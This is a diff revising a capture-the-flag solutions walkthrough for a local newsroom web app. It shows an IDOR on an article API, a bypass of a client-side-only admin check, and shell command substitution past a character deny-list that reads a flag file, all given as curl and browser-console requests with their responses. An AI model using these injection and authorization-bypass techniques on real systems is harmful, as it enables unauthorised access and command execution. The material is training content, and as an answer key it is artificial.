@@ -1,6 +1,5 @@
 # CTF 8 -- Solutions
 
-> **Instructors/markers only.** Do not distribute to participants.
 
 ---
 
@@ -37,7 +36,7 @@ Example for `abcd12`:
 
 ### Flag 1 -- IDOR (`GET /api/articles/:id`)
 
-The article API looks up articles by integer ID with no check that the requesting user is the author. Because IDs are sequential (1..9) and the UI only shows the player their own articles, they must enumerate foreign IDs to find Sarah Lin's investigative draft (article 3). The server renders `{{PLAYER_FLAG1}}` into the article body at response time using the viewer's username, so each player retrieves their own personal flag.
+The article API looks up articles by integer ID with no check that the requesting user is the author. IDs are sequential starting from 1; the archive page lists published pieces and the caller's own pieces, so the gaps in the listing (`#3`, `#8`) are a visible breadcrumb that foreign drafts exist. The server renders `{{PLAYER_FLAG1}}` into the article body at response time using the viewer's username, so each player retrieves their own personal flag.
 
 ### Flag 2 -- Missing Server-Side Authorisation (`/api/admin/dashboard`)
 
@@ -59,45 +58,64 @@ The host field is filtered with a naive deny-list of `;`, `|`, `&`, `\n`, `\r`. 
 
 ### Step 0: Start the application and log in
 
+Start the challenge (instructor step -- you may already have this running):
+
 ```bash
 cd CTFs/challenge-generation && node chgen_ctf8.js abcd12 efgh34 ijkl56
 cd ../CTF_8_gazette && docker compose up --build
 ```
 
-Either log in at http://localhost:3002 in a browser, or log in via curl and save the session cookie for the command-line walkthrough below. The password for `abcd12` is printed by `chgen_ctf8.js` and also stored in `src/data/users.json`.
+Open http://localhost:3002 in a browser and log in as `abcd12`. The generator prints the password to the terminal; it's also readable in `src/data/users.json`.
+
+Most of this walkthrough runs in the browser -- DevTools Network tab and the browser console are enough to get all three flags. If you prefer the command line, you can copy your session cookie after logging in:
+
+1. Open DevTools (F12) -> **Application** (Chrome) or **Storage** (Firefox) -> **Cookies** -> `http://localhost:3002`.
+2. Copy the value of the cookie named `pressroom_session`.
+3. Use it with curl via the `Cookie` header:
 
 ```bash
-# Capture the abcd12 password from users.json
-PASS=$(grep -A1 '"abcd12"' src/data/users.json | grep password | awk -F'"' '{print $4}')
-
-# Log in and save the pressroom_session cookie
-curl -sS -c cookies.txt -X POST http://localhost:3002/login \
-  -d "username=abcd12&password=$PASS" \
-  -o /dev/null --max-redirs 0
+SESSION="paste-the-pressroom_session-value-here"
+curl -sS -H "Cookie: pressroom_session=$SESSION" http://localhost:3002/api/me
+# => {"username":"abcd12","role":"contributor","display_name":"abcd12"}
 ```
 
-A successful login returns HTTP 302; the `-c cookies.txt` writes the `pressroom_session` cookie for the next requests. If subsequent calls return `{"error":"authentication required"}`, the cookie jar is empty -- repeat this step before continuing.
+If any call returns `{"error":"authentication required"}`, your cookie has expired or you forgot the `Cookie` header -- log in again and re-copy the value.
 
 ---
 
 ### Step 1: Flag 1 via IDOR
 
-On the dashboard, the player sees only their own drafts. A breadcrumb TODO in the dashboard HTML source hints at per-user filtering, and an article summary references "articles 7 to 10" -- implying lower IDs exist and are not yours.
+The login page carries a dev handover note: *"Marcus left the archive APIs in an intermediate migration state. Ownership enforcement landed on the frontend only; the server-side audit is still pending."* That's your class hint -- something on the archive side is filtered on the client, not the server.
 
-**Payload:**
+After sign-in the dashboard shows a single piece filed under your byline: an onboarding draft at `#10` titled *"Welcome to PressRoom -- file your first piece"*. Click it. The URL bar shows `/articles/10`, and if you open **DevTools -> Network** and reload, you can see the browser hit `/api/articles/10` and receive the same article as JSON. That tells you two things:
 
-```bash
-curl -sS -b cookies.txt http://localhost:3002/api/articles/3
+- `/articles/<id>` and `/api/articles/<id>` are the same piece, one rendered as HTML and one as JSON.
+- IDs are integers.
+
+Now click **Archive** in the top nav. The listing is a table ordered by ID: `#1`, `#2`, `#4`, `#5`, `#6`, `#7`, `#9`, `#10`. Note the gaps -- `#3` and `#8` are missing. Every article with `status: published` is listed, plus your own pieces (`#10`). The missing IDs must be drafts filed by someone else. The login notice promised the ownership check lives on the frontend only, so try the API directly:
+
+**In the browser:** visit `http://localhost:3002/articles/3` directly.
+
+**In the browser console:**
+
+```js
+fetch('/api/articles/3').then(r => r.json()).then(console.log)
 ```
 
-**Response body contains:**
+**Or with curl (using the `$SESSION` cookie value from Step 0):**
+
+```bash
+curl -sS -H "Cookie: pressroom_session=$SESSION" http://localhost:3002/api/articles/3
+```
+
+**The response body contains:**
 
 ```
 DRAFT: The tips that won't stop coming
 ... the confidential marker for this draft is: durham-gzflag1{15d4f4c31e2c8c80_abcd12} ...
 ```
 
-The same article, viewed by a different logged-in player, returns that player's own flag1. The server substitutes `{{PLAYER_FLAG1}}` from the FlagStore using the session's username.
+Article 3 is Sarah Lin's draft (author id 1), but you fetched it as contributor `abcd12` with no ownership check. Each player who runs the same request gets their OWN flag1 because the server substitutes the `{{PLAYER_FLAG1}}` placeholder using the session's username.
 
 The draft body also breadcrumbs Flag 2: *"I have asked Marcus's replacement to lock down the admin panel at /admin, but I suspect the API endpoints are still wide open."*
 
@@ -105,7 +123,9 @@ The draft body also breadcrumbs Flag 2: *"I have asked Marcus's replacement to l
 
 ### Step 2: Flag 2 via Missing Server-Side Auth
 
-Visiting `http://localhost:3002/admin` in a browser flashes the dashboard then redirects to `/dashboard?error=admin_required`. The redirect is driven entirely by `static/js/admin.js`:
+Visit `http://localhost:3002/admin` in the browser. The page briefly flashes, then the browser bounces you back to `/dashboard?error=admin_required`. That's a client-side redirect -- the server was happy to serve the page.
+
+Open DevTools -> **Network** tab -> reload `/admin`. You'll see `/api/me` (returns `role: "contributor"`) and the redirect triggered by `static/js/admin.js`:
 
 ```js
 const me = await (await fetch('/api/me')).json();
@@ -113,17 +133,25 @@ if (me.role !== 'admin') { window.location = '/dashboard?error=admin_required'; 
 const data = await (await fetch('/api/admin/dashboard')).json();
 ```
 
-Calling the API directly bypasses the guard:
+The redirect is JavaScript, not a server response. Call the admin API directly:
+
+**In the browser console:**
+
+```js
+fetch('/api/admin/dashboard').then(r => r.json()).then(console.log)
+```
+
+**Or with curl:**
 
 ```bash
-curl -sS -b cookies.txt http://localhost:3002/api/admin/dashboard
+curl -sS -H "Cookie: pressroom_session=$SESSION" http://localhost:3002/api/admin/dashboard
 ```
 
 The response contains:
 
-- `flag`: `durham-gzflag2{...}`
-- `maintenance_tools[]` including Marcus Webb's "Network Diagnostics" entry pointing at `/api/admin/health` with an example body `{"host": "example.com"}`
-- The full user directory including `marcus.webb` (active=false), confirming the redundancy narrative
+- `flag`: `durham-gzflag2{...}` -- your Flag 2.
+- `maintenance_tools[]` including Marcus Webb's "Network Diagnostics" entry pointing at `/api/admin/health` with an example body `{"host": "example.com"}`.
+- The full user directory including `marcus.webb` (active=false), confirming the redundancy narrative.
 
 The `maintenance_tools` entry is the breadcrumb to Flag 3.
 
@@ -131,35 +159,56 @@ The `maintenance_tools` entry is the breadcrumb to Flag 3.
 
 ### Step 3: Flag 3 via Command Substitution
 
-First, confirm the blocklist rejects obvious injection:
+From the Flag 2 response you know the endpoint: `POST /api/admin/health` with a JSON body `{"host": "..."}`. First probe it with a normal host and an obvious injection.
+
+**In the browser console:**
+
+```js
+// baseline ping
+fetch('/api/admin/health', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({host:'127.0.0.1'})
+}).then(r => r.json()).then(console.log)
+
+// naive injection
+fetch('/api/admin/health', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({host:'127.0.0.1;ls'})
+}).then(r => r.json()).then(console.log)
+// => 400 {"error":"Invalid host: forbidden characters detected"}
+```
+
+**Or with curl:**
 
 ```bash
-curl -sS -b cookies.txt -X POST http://localhost:3002/api/admin/health \
-  -H "Content-Type: application/json" \
-  -d '{"host":"127.0.0.1;ls"}'
+curl -sS -H "Cookie: pressroom_session=$SESSION" \
+     -H "Content-Type: application/json" \
+     -X POST http://localhost:3002/api/admin/health \
+     -d '{"host":"127.0.0.1;ls"}'
 # => 400 {"error":"Invalid host: forbidden characters detected"}
 ```
 
-The block list lives in `internal/services/health.go`:
-```go
-var blockedChars = []string{";", "|", "&", "\n", "\r"}
-```
+The block list (visible in `internal/services/health.go` if you have the source) is `;`, `|`, `&`, `\n`, `\r`. None of `$`, `(`, `)`, or backtick are blocked, so command substitution `$(...)` goes straight through.
 
-No `$`, `(`, `)`, or backtick. Use command substitution:
+**Confirm the bypass:**
 
 ```bash
-curl -sS -b cookies.txt -X POST http://localhost:3002/api/admin/health \
-  -H "Content-Type: application/json" \
-  -d '{"host":"$(echo pressroom_bypass_marker)"}'
-# => ping: pressroom_bypass_marker: Name does not resolve
+curl -sS -H "Cookie: pressroom_session=$SESSION" \
+     -H "Content-Type: application/json" \
+     -X POST http://localhost:3002/api/admin/health \
+     -d '{"host":"$(echo pressroom_bypass_marker)"}'
+# => "output": "ping: pressroom_bypass_marker: Name does not resolve\n"
 ```
 
-Bypass confirmed. Read the flag file:
+Ping tried to resolve the shell's output as a hostname and echoed it back in the error. Now read the flag file:
 
 ```bash
-curl -sS -b cookies.txt -X POST http://localhost:3002/api/admin/health \
-  -H "Content-Type: application/json" \
-  -d '{"host":"$(cat /app/flags/flag3-abcd12.txt)"}'
+curl -sS -H "Cookie: pressroom_session=$SESSION" \
+     -H "Content-Type: application/json" \
+     -X POST http://localhost:3002/api/admin/health \
+     -d '{"host":"$(cat /app/flags/flag3-abcd12.txt)"}'
 ```
 
 **Response:**
@@ -178,10 +227,12 @@ The flag is echoed directly in ping's error output.
 
 ---
 
-## One-liner Verification
+## One-liner Verification (Instructor / Marker)
+
+This is an automated pass for instructors verifying the chain without going through the browser. It reads the password from `src/data/users.json`, logs in, and runs each exploit in turn. Run from the repo root.
 
 ```bash
-PASS=$(grep abcd12 src/data/users.json | head -1 | awk -F'"' '{print $4}')
+PASS=$(grep -A1 '"abcd12"' CTFs/CTF_8_gazette/src/data/users.json | grep password | awk -F'"' '{print $4}')
 COOKIE=$(mktemp)
 curl -sS -c $COOKIE -X POST http://localhost:3002/login -d "username=abcd12&password=$PASS" -o /dev/null --max-redirs 0
 
